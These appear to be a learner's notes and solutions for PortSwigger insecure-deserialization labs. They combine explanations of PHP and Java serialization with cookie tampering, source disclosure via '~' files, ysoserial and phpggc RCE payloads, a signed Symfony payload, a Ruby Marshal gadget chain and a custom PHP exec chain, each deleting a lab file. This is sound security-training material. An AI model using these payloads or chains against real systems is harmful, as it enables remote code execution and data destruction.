* Many deserialization-based attacks are completed before deserialization is finished

```
PHP serialization format

PHP uses a mostly human-readable string format, with letters representing the data type and numbers representing the length of each entry. For example, consider a User object with the attributes:

$user->name = "carlos";
$user->isLoggedIn = true;

When serialized, this object may look something like this:

O:4:"User":2:{s:4:"name":s:6:"carlos"; s:10:"isLoggedIn":b:1;}

This can be interpreted as follows:

    O:4:"User" - An object with the 4-character class name "User"
    2 - the object has 2 attributes
    s:4:"name" - The key of the first attribute is the 4-character string "name"
    s:6:"carlos" - The value of the first attribute is the 6-character string "carlos"
    s:10:"isLoggedIn" - The key of the second attribute is the 10-character string "isLoggedIn"
    b:1 - The value of the second attribute is the boolean value true

The native methods for PHP serialization are serialize() and unserialize(). If you have source code access, you should start by looking for unserialize() anywhere in the code and investigating further. 
```
```
Java serialization format

Some languages, such as Java, use binary serialization formats. This is more difficult to read, but you can still identify serialized data if you know how to recognize a few tell-tale signs. For example, serialized Java objects always begin with the same bytes, which are encoded as ac ed in hexadecimal and rO0 in Base64.

Any class that implements the interface java.io.Serializable can be serialized and deserialized. If you have source code access, take note of any code that uses the readObject() method, which is used to read and deserialize data from an InputStream. 
```

### Lab 1

#### Modifying serialized objects

```
decode session cookie to O:4:"User":2:{s:8:"username";s:6:"wiener";s:5:"admin";b:0;}
edit and change admin bool object to true resend
```

### Lab 2

#### Modifying serialized data types pt.2

```
decode cookie as O:4:"User":2:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"dfgg04acvdpio0iv6t8a8i8ukobknktt";}
change type of access token to int and set value as 0 this will be set as true cause php === bug
O:4:"User":2:{s:8:"username";s:6:"wiener";s:12:"access_token";i:0;}
```

```
Magic methods

Magic methods are a special subset of methods that you do not have to explicitly invoke. Instead, they are invoked automatically whenever a particular event or scenario occurs. Magic methods are a common feature of object-oriented programming in various languages. They are sometimes indicated by prefixing or surrounding the method name with double-underscores.

Developers can add magic methods to a class in order to predetermine what code should be executed when the corresponding event or scenario occurs. Exactly when and why a magic method is invoked differs from method to method. One of the most common examples in PHP is __construct(), which is invoked whenever an object of the class is instantiated, similar to Python's __init__. Typically, constructor magic methods like this contain code to initialize the attributes of the instance. However, magic methods can be customized by developers to execute any code they want.

Magic methods are widely used and do not represent a vulnerability on their own. But they can become dangerous when the code that they execute handles attacker-controllable data, for example, from a deserialized object. This can be exploited by an attacker to automatically invoke methods on the deserialized data when the corresponding conditions are met.

Most importantly in this context, some languages have magic methods that are invoked automatically during the deserialization process. For example, PHP's unserialize() method looks for and invokes an object's __wakeup() magic method.

In Java deserialization, the same applies to the readObject() method, which essentially acts like a constructor for "re-initializing" a serialized object. The ObjectInputStream.readObject() method is used to read data from the initial byte stream. However, serializable classes can also declare their own readObject() methods as follows:

private void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException {...};

This allows the class to control the deserialization of its own fields more closely. Crucially, a readObject() method declared in exactly this way acts as a magic method that is invoked during deserialization.

You should pay close attention to any classes that contain these types of magic methods. They allow you to pass data from a serialized object into the website's code before the object is fully deserialized. This is the starting point for creating more advanced exploits. 
```


### Lab 3

#### Using application functionality to exploit insecure deserialization

```

```

### Lab 4 

#### Arbitrary object injection in PHP

* get php file source code by appending ~ to file name EXAMPLE BELOW
```
GET /libs/CustomTemplate.php~ HTTP/1.1
Host: ac951fd61f5e9a9d805e017800e100d4.web-security-academy.net
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://ac951fd61f5e9a9d805e017800e100d4.web-security-academy.net/login
Connection: close
Cookie: session=Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjMyOiJ1bGQzNGRjNmpnaGJweGF1b2JneGV0M3ljZHllZG1iNiI7fQ%3d%3d
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0
```

* request above returns source code of php file

take source code and use to create own object that will be injected into cookie NOTE that you need to remove the second attribute of template_file_path and make the them public variables

```php
<?php
class CustomTemplate {
    public $template_file_path;
    public $lock_file_path;

    public function __construct($template_file_path) {
        $this->template_file_path = $template_file_path;
        $this->lock_file_path = $template_file_path . ".lock";
    }

    private function isTemplateLocked() {
        return file_exists($this->lock_file_path);
    }

    public function getTemplate() {
        return file_get_contents($this->template_file_path);
    }

    public function saveTemplate($template) {
        if (!isTemplateLocked()) {
            if (file_put_contents($this->lock_file_path, "") === false) {
                throw new Exception("Could not write to " . $this->lock_file_path);
            }
            if (file_put_contents($this->template_file_path, $template) === false) {
                throw new Exception("Could not write to " . $this->template_file_path);
            }
        }
    }

    function __destruct() {
        // Carlos thought this would be a good idea
        if (file_exists($this->lock_file_path)) {
            unlink($this->lock_file_path);
        }
    }
}

$obj = new CustomTemplate("/home/carlos/morale.txt");
echo Serialize($obj);
echo "\n"
?>


replace with your php created object below
O:14:"CustomTemplate":1:{s:14:"lock_file_path";s:23:"/home/carlos/morale.txt";}
```

```
Gadget chains

A "gadget" is a snippet of code that exists in the application that can help an attacker to achieve a particular goal. An individual gadget may not directly do anything harmful with user input. However, the attacker's goal might simply be to invoke a method that will pass their input into another gadget. By chaining multiple gadgets together in this way, an attacker can potentially pass their input into a dangerous "sink gadget", where it can cause maximum damage.

It is important to understand that, unlike some other types of exploit, a gadget chain is not a payload of chained methods constructed by the attacker. All of the code already exists on the website. The only thing the attacker controls is the data that is passed into the gadget chain. This is typically done using a magic method that is invoked during deserialization, sometimes known as a "kick-off gadget".

In the wild, many insecure deserialization vulnerabilities will only be exploitable through the use of gadget chains. This can sometimes be a simple one or two-step chain, but constructing high-severity attacks will likely require a more elaborate sequence of object instantiations and method invocations. Therefore, being able to construct gadget chains is one of the key aspects of successfully exploiting insecure deserialization.
Working with pre-built gadget chains

Manually identifying gadget chains can be a fairly arduous process, and is almost impossible without source code access. Fortunately, there are a few options for working with pre-built gadget chains that you can try first.

There are several tools available that can help you construct gadget chains with minimal effort. These tools provide a range of pre-discovered gadget chains that have been exploited on other websites. Having identified an insecure deserialization vulnerability on your target site, you can use these tools to try and exploit it, even if you do not have access to the source code. This approach is made possible due to the widespread use of libraries that contain exploitable gadget chains. For example, if a gadget chain that relies on Java's Apache Commons Collections library can be exploited on one website, any other website that implements this library may also be exploitable using the same chain.

One such tool for Java deserialization exploits is "ysoserial". You simply specify a library that you think the target application is using, then provide a command that you want to try and execute. The tool creates an appropriate serialized object based on a gadget chain it knows for the given library. This still involves a certain amount of trial and error, but it is considerably less labor-intensive than constructing your own gadget chains manually. 
```

### Lab 5 

#### Exploiting Java deserialization with Apache Commons

```
java -jar ysoserial-master-6eca5bc740-1.jar CommonsCollections4 'rm /home/carlos/morale.txt' | base64 -w0 | xclip -sel clip
```


### Lab 6


#### Exploiting PHP deserialization with a pre-built gadget chain

```php
"""decode cookie and see it has an object b64 encoded and a hash (hash is used to verify object hasnt been changed)
edit the hash and send it to reveal php app is running laravel 3.4
use phpggc to generate object with RCE for that laravel version
look at home page source and see phpinfo is exposed check env variables and see that it has the secret key that is used to create the signed cookie
create php script to take ur b64 rce object and add a signed cookie code is below"""

<?php
// ./phpggc Symfony/RCE4 exec 'rm /home/carlos/morale.txt' | base64 -w0 | xclip -sel clip
// secret key taken from phpinfo page
$secretKey = "clohn39rlxkwnohvuiq3orq9b3qef3kd";
$object = "Tzo0NzoiU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxUYWdBd2FyZUFkYXB0ZXIiOjI6e3M6NTc6IgBTeW1mb255XENvbXBvbmVudFxDYWNoZVxBZGFwdGVyXFRhZ0F3YXJlQWRhcHRlcgBkZWZlcnJlZCI7YToxOntpOjA7TzozMzoiU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQ2FjaGVJdGVtIjoyOntzOjExOiIAKgBwb29sSGFzaCI7aToxO3M6MTI6IgAqAGlubmVySXRlbSI7czoyNjoicm0gL2hvbWUvY2FybG9zL21vcmFsZS50eHQiO319czo1MzoiAFN5bWZvbnlcQ29tcG9uZW50XENhY2hlXEFkYXB0ZXJcVGFnQXdhcmVBZGFwdGVyAHBvb2wiO086NDQ6IlN5bWZvbnlcQ29tcG9uZW50XENhY2hlXEFkYXB0ZXJcUHJveHlBZGFwdGVyIjoyOntzOjU0OiIAU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxQcm94eUFkYXB0ZXIAcG9vbEhhc2giO2k6MTtzOjU4OiIAU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxQcm94eUFkYXB0ZXIAc2V0SW5uZXJJdGVtIjtzOjQ6ImV4ZWMiO319Cg==";

echo $payload = urlencode('{"token":"' . $object . '","sig_hmac_sha1":"' . hash_hmac('sha1', $object, $secretKey) . '"}');
echo "\n";
?>
```

### Lab 7

#### Exploiting Ruby deserialization using a documented gadget chain

 * https://www.elttam.com//blog/ruby-deserialization/#content


 ```ruby
class Gem::StubSpecification
  def initialize; end
end


stub_specification = Gem::StubSpecification.new
stub_specification.instance_variable_set(:@loaded_from, "|rm /home/carlos/morale.txt 1>&2")

puts "STEP n"
stub_specification.name rescue nil
puts


class Gem::Source::SpecificFile
  def initialize; end
end

specific_file = Gem::Source::SpecificFile.new
specific_file.instance_variable_set(:@spec, stub_specification)

other_specific_file = Gem::Source::SpecificFile.new

puts "STEP n-1"
specific_file <=> other_specific_file rescue nil
puts


$dependency_list= Gem::DependencyList.new
$dependency_list.instance_variable_set(:@specs, [specific_file, other_specific_file])

puts "STEP n-2"
$dependency_list.each{} rescue nil
puts


class Gem::Requirement
  def marshal_dump
    [$dependency_list]
  end
end

payload = Marshal.dump(Gem::Requirement.new)

puts "STEP n-3"
Marshal.load(payload) rescue nil
puts


puts "VALIDATION (in fresh ruby process):"
IO.popen("ruby -e 'Marshal.load(STDIN.read) rescue nil'", "r+") do |pipe|
  pipe.print payload
  pipe.close_write
  puts pipe.gets
  puts
end

puts "Payload (hex):"
puts payload.unpack('H*')[0]
puts


require "base64"
puts "Payload (Base64 encoded):"
puts Base64.encode64(payload)
 ```

### Creating your own exploit
```
Creating your own exploit

When off-the-shelf gadget chains and documented exploits are unsuccessful, you will need to create your own exploit.

To successfully build your own gadget chain, you will almost certainly need source code access. The first step is to study this source code to identify a class that contains a magic method that is invoked during deserialization. Assess the code that this magic method executes to see if it directly does anything dangerous with user-controllable attributes. This is always worth checking just in case.

If the magic method is not exploitable on its own, it can serve as your "kick-off gadget" for a gadget chain. Study any methods that the kick-off gadget invokes. Do any of these do something dangerous with data that you control? If not, take a closer look at each of the methods that they subsequently invoke, and so on.

Repeat this process, keeping track of which values you have access to, until you either reach a dead end or identify a dangerous sink gadget into which your controllable data is passed.

Once you've worked out how to successfully construct a gadget chain within the application code, the next step is to create a serialized object containing your payload. This is simply a case of studying the class declaration in the source code and creating a valid serialized object with the appropriate values required for your exploit. As we have seen in previous labs, this is relatively simple when working with string-based serialization formats.

Working with binary formats, such as when constructing a Java deserialization exploit, can be particularly cumbersome. When making minor changes to an existing object, you might be comfortable working directly with the bytes. However, when making more significant changes, such as passing in a completely new object, this quickly becomes impractical. It is often much simpler to write your own code in the target language in order to generate and serialize the data yourself.

When creating your own gadget chain, look out for opportunities to use this extra attack surface to trigger secondary vulnerabilities. 
```

### Lab 8

#### Developing a custom gadget chain for PHP deserialization

source code that allows you to create a gadget based on the classes and magic methods within them
```php
<?php

class CustomTemplate {
    private $default_desc_type;
    private $desc;
    public $product;

    public function __construct($desc_type='HTML_DESC') {
        $this->desc = new Description();
        $this->default_desc_type = $desc_type;
        // Carlos thought this is cool, having a function called in two places... What a genius
        $this->build_product();
    }

    public function __sleep() {
        return ["default_desc_type", "desc"];
    }

    public function __wakeup() {
        $this->build_product();
    }

    private function build_product() {
        $this->product = new Product($this->default_desc_type, $this->desc);
    }
}

class Product {
    public $desc;

    public function __construct($default_desc_type, $desc) {
        $this->desc = $desc->$default_desc_type;
    }
}

class Description {
    public $HTML_DESC;
    public $TEXT_DESC;

    public function __construct() {
        // @Carlos, what were you thinking with these descriptions? Please refactor!
        $this->HTML_DESC = '<p>This product is <blink>SUPER</blink> cool in html</p>';
        $this->TEXT_DESC = 'This product is cool in text';
    }
}

class DefaultMap {
    private $callback;

    public function __construct($callback) {
        $this->callback = $callback;
    }

    public function __get($name) {
        return call_user_func($this->callback, $name);
    }
}
?>
```

code for generating payload that exploits the above code
```php
<?php
class CustomTemplate {
    public $default_desc_type;
    public $desc;
    public function __construct(){
    	$this->default_desc_type = "rm /home/carlos/morale.txt";
    	$this->desc = new DefaultMap("exec");
    }
    
}

class DefaultMap {
    private $callback;

    public function __construct($callback) {
        $this->callback = $callback;
    }

    public function __get($name) {
        return call_user_func($this->callback, $name);
    }
}
$obj = new CustomTemplate();
echo base64_encode(Serialize($obj));
echo "\n";
?>
```


```
 In the source code, notice that the __wakeup() magic method for a CustomTemplate will create a new Product by referencing the default_desc_type and desc from the CustomTemplate. Also notice that the DefaultMap class has the __get() magic method, which will be invoked if you try to read an attribute that doesn't exist for this object. This magic method invokes call_user_func(), which will execute any function that is passed into it via the DefaultMap->callback attribute. The function will be executed on the $name, which is the non-existent attribute that was requested

you can exploit this gadget chain to invoke exec(rm /home/carlos/morale.txt) by passing in a CustomTemplate object where:
CustomTemplate->default_desc_type = "rm /home/carlos/morale.txt";
CustomTemplate->desc = DefaultMap;
DefaultMap->callback = "exec"
If you follow the data flow in the source code, you will n
```